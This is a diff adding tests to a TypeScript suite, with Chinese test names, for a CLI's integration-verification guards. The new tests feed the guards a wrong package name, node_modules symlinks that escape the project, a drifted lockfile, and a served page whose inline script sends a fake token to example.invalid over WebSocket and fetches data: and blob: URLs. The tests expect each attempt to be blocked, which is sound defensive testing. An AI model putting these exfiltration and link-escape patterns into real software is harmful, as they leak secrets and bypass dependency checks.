@@ -15,6 +15,7 @@ import { createHash } from 'node:crypto';
 import * as fs from 'node:fs';
 import * as os from 'node:os';
 import * as path from 'node:path';
+import * as http from 'node:http';
 import { canonicalJson } from '../../packages/component-cli/src/contracts/schema.js';
 import { validateIntegrationVerificationReport } from '../../packages/component-cli/src/contracts/integration-verification.js';
 import type {
@@ -313,6 +314,7 @@ describe('T17 A1 verifyIntegration（本地验证与证据报告）', () => {
     applyResult: IntegrationApplyResultV1,
     overrides?: {
       commands?: IntegrationVerificationSpecV1['commands'];
+      browser?: IntegrationVerificationSpecV1['browser'];
       businessGaps?: IntegrationVerificationSpecV1['businessGaps'];
       authOverrides?: Partial<IntegrationExecutionAuthorizationV1>;
     },
@@ -324,7 +326,7 @@ describe('T17 A1 verifyIntegration（本地验证与证据报告）', () => {
     const manifestHash =
       applyResult.afterHashes.find(h => h.path === manifestPath)?.sha256 ??
       plan.baseFileHashes.find(h => h.path === manifestPath)?.sha256 ??
-      sha256Hex(fs.readFileSync(path.join(root, manifestPath)));
+      sha256Hex(fs.readFileSync(path.join(canonicalRoot, manifestPath)));
     const planDigest = canonicalDigest(plan);
     const applyResultDigest = canonicalDigest(applyResult);
 
@@ -338,6 +340,7 @@ describe('T17 A1 verifyIntegration（本地验证与证据报告）', () => {
         { kind: 'build', script: 'build', manifestPath, manifestSha256: manifestHash, timeoutMs: 30_000, outputDirectories: ['dist'] },
       ],
       businessGaps: overrides?.businessGaps ?? [],
+      ...(overrides?.browser ? { browser: overrides.browser } : {}),
     };
     const specDigest = canonicalDigest(spec);
     const authorization: IntegrationExecutionAuthorizationV1 = {
@@ -348,7 +351,7 @@ describe('T17 A1 verifyIntegration（本地验证与证据报告）', () => {
       specDigest,
       operation: 'verify',
       allowProjectScripts: true,
-      allowBrowser: false,
+      allowBrowser: Boolean(overrides?.browser),
       scriptNames: [...new Set(spec.commands.map(c => c.script))],
       allowedRepairPaths: [],
       maxAttempts: 0,
@@ -424,6 +427,131 @@ describe('T17 A1 verifyIntegration（本地验证与证据报告）', () => {
     expect(reportMismatch).toBeDefined();
     expect(reportMismatch!.status).toBe('failed');
     expect(reportMismatch!.checks.find(c => c.id === 'dependency-guard')?.status).toBe('failed');
+  });
+
+  it('拒绝错误包名、node_modules 链接逃逸和与计划不符的锁文件', async () => {
+    const { root, canonicalRoot, artifactRoot, plan, applyResult } = await setupAppliedProject();
+    const { spec, authorization } = makeSpecAndAuth(canonicalRoot, plan, applyResult);
+    const packageManifest = path.join(root, 'node_modules', 'echarts', 'package.json');
+
+    writeJson(packageManifest, { name: 'other-package', version: ECHARTS_VERSION });
+    const wrongName = await callVerify(cliExports, root, plan, { applyResult, spec, authorization, artifactRoot });
+    expect(wrongName?.checks.find(c => c.id === 'dependency-guard')?.status).toBe('failed');
+
+    writeJson(packageManifest, { name: 'echarts', version: ECHARTS_VERSION });
+    const outside = makeTempDir('zhinexus-t17-dep-outside-');
+    writeJson(path.join(outside, 'package.json'), { name: 'echarts', version: ECHARTS_VERSION });
+    fs.rmSync(path.join(root, 'node_modules', 'echarts'), { recursive: true, force: true });
+    fs.symlinkSync(outside, path.join(root, 'node_modules', 'echarts'), 'junction');
+    const linked = await callVerify(cliExports, root, plan, { applyResult, spec, authorization, artifactRoot });
+    expect(linked?.checks.find(c => c.id === 'dependency-guard')?.status).toBe('failed');
+
+    fs.rmSync(path.join(root, 'node_modules', 'echarts'), { recursive: true, force: true });
+    writeJson(path.join(root, 'node_modules', 'echarts', 'package.json'), { name: 'echarts', version: ECHARTS_VERSION });
+    const lock = buildVuePackageLock();
+    const lockPackages = lock.packages as Record<string, { version?: string }>;
+    lockPackages['node_modules/echarts'] = { version: '5.5.0' };
+    const lockPath = path.join(root, 'package-lock.json');
+    writeJson(lockPath, lock);
+    const lockSha = sha256Hex(fs.readFileSync(lockPath));
+    const lockBaselinePlan = structuredClone(plan);
+    const baseLockSnapshot = lockBaselinePlan.baseFileHashes.find(snapshot => snapshot.path === 'package-lock.json')!;
+    baseLockSnapshot.sha256 = lockSha;
+    const inspectionLockSnapshot = lockBaselinePlan.localProject.fileSnapshots.find(snapshot => snapshot.path === 'package-lock.json')!;
+    inspectionLockSnapshot.sha256 = lockSha;
+    const trustedLockDriftApplyResult: IntegrationApplyResultV1 = {
+      ...applyResult,
+      planDigest: canonicalDigest(lockBaselinePlan),
+    };
+    const { spec: lockSpec, authorization: lockAuthorization } = makeSpecAndAuth(canonicalRoot, lockBaselinePlan, trustedLockDriftApplyResult);
+    const driftedLock = await callVerify(cliExports, root, lockBaselinePlan, {
+      applyResult: trustedLockDriftApplyResult,
+      spec: lockSpec,
+      authorization: lockAuthorization,
+      artifactRoot,
+    });
+    expect(driftedLock?.status).toBe('failed');
+    expect(driftedLock?.checks.find(c => c.id === 'dependency-guard')?.status).toBe('failed');
+    expect(driftedLock?.checks.find(c => c.id === 'dependency-guard')?.issues.some(i => i.code === 'DEPENDENCY_MISMATCH')).toBe(true);
+  });
+
+  it('快照重读失败时记录源守卫失败，不以初始快照冒充结束快照', async () => {
+    const { root, canonicalRoot, artifactRoot, plan, applyResult } = await setupAppliedProject({
+      scripts: {
+        typecheck: 'node -e "process.exit(0)"',
+        build: 'node -e "const fs=require(\'fs\');fs.mkdirSync(\'dist\',{recursive:true});fs.symlinkSync(\'dist\',\'blocked-link\',\'junction\')"',
+      },
+    });
+    const { spec, authorization } = makeSpecAndAuth(canonicalRoot, plan, applyResult);
+    const report = await callVerify(cliExports, root, plan, { applyResult, spec, authorization, artifactRoot });
+    expect(report?.status).not.toBe('passed');
+    expect(report?.checks.find(c => c.id === 'source-guard')?.status).toBe('failed');
+    expect(report?.pendingItems.some(i => i.code === 'PATH_UNSAFE')).toBe(true);
+  });
+
+  it('允许 pnpm node_modules 内部链接并拒绝链接逃逸项目 node_modules', async () => {
+    const { root, canonicalRoot, artifactRoot, plan, applyResult } = await setupAppliedProject({ packageManager: 'pnpm' });
+    const { spec, authorization } = makeSpecAndAuth(canonicalRoot, plan, applyResult);
+    const nodeModules = path.join(root, 'node_modules');
+    const echartsDir = path.join(nodeModules, 'echarts');
+    const storeDir = path.join(nodeModules, '.pnpm', 'echarts@' + ECHARTS_VERSION, 'node_modules', 'echarts');
+    fs.rmSync(echartsDir, { recursive: true, force: true });
+    writeJson(path.join(storeDir, 'package.json'), { name: 'echarts', version: ECHARTS_VERSION });
+    fs.symlinkSync(storeDir, echartsDir, 'junction');
+    const internal = await callVerify(cliExports, root, plan, { applyResult, spec, authorization, artifactRoot });
+    expect(internal?.checks.find(c => c.id === 'dependency-guard')?.status).toBe('passed');
+
+    const outside = makeTempDir('zhinexus-t17-pnpm-outside-');
+    writeJson(path.join(outside, 'package.json'), { name: 'echarts', version: ECHARTS_VERSION });
+    fs.rmSync(echartsDir, { recursive: true, force: true });
+    fs.symlinkSync(outside, echartsDir, 'junction');
+    const escaped = await callVerify(cliExports, root, plan, { applyResult, spec, authorization, artifactRoot });
+    expect(escaped?.checks.find(c => c.id === 'dependency-guard')?.status).toBe('failed');
+  });
+
+  it('浏览器拒绝 data/blob 与外源 WebSocket，保留同源 WebSocket 且诊断移除 URL 查询令牌', async () => {
+    const server = http.createServer((_request, response) => {
+      const port = (server.address() as import('node:net').AddressInfo).port;
+      response.writeHead(200, { 'content-type': 'text/html' });
+      response.end('<html><body><main>ready</main><script>' +
+        "fetch('data:text/plain,secret').catch(()=>{});" +
+        "fetch(URL.createObjectURL(new Blob(['secret']))).catch(()=>{});" +
+        "new WebSocket('ws://127.0.0.1:" + port + "/same');" +
+        "try { new WebSocket('ws://example.invalid/private?token=URL_SECRET_7429'); } catch {}" +
+        "setTimeout(()=>{throw new Error('runtime https://example.invalid/error?token=URL_SECRET_7429')},200);" +
+        '</script></body></html>');
+    });
+    await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve));
+    const addr = server.address() as import('node:net').AddressInfo;
+    const url = 'http://127.0.0.1:' + addr.port + '/';
+    try {
+      const { root, canonicalRoot, artifactRoot, plan, applyResult } = await setupAppliedProject();
+      const { spec, authorization } = makeSpecAndAuth(canonicalRoot, plan, applyResult, {
+        browser: {
+          url,
+          readySelector: 'main',
+          timeoutMs: 10_000,
+          viewport: { width: 640, height: 480 },
+          renderer: 'canvas',
+          theme: 'light',
+          actions: [],
+          assertions: [{ kind: 'visible', selector: 'main' }],
+        },
+      });
+      const report = await callVerify(cliExports, root, plan, { applyResult, spec, authorization, artifactRoot });
+      expect(report?.checks.find(c => c.id === 'browser')?.status).toBe('failed');
+      const behavior = report!.artifacts.find(a => a.path.endsWith('behavior.json'))!;
+      const evidence = fs.readFileSync(path.join(artifactRoot, behavior.path), 'utf8');
+      expect(evidence).not.toContain('URL_SECRET_7429');
+      expect(evidence).not.toContain('example.invalid');
+      expect(evidence).not.toContain('data:text');
+      expect(evidence).not.toContain('blob:');
+      expect(evidence.match(/outbound_blocked/g)?.length).toBeGreaterThanOrEqual(2);
+      expect(evidence.match(/websocket_blocked/g)?.length).toBe(1);
+      expect(JSON.stringify(report)).not.toContain('URL_SECRET_7429');
+    } finally {
+      await new Promise<void>(resolve => server.close(() => resolve()));
+    }
   });
 
   it('运行 npm 与 pnpm 授权脚本且不触发 pre/post poison sentinel，合法 dist 不报源变更', async () => {
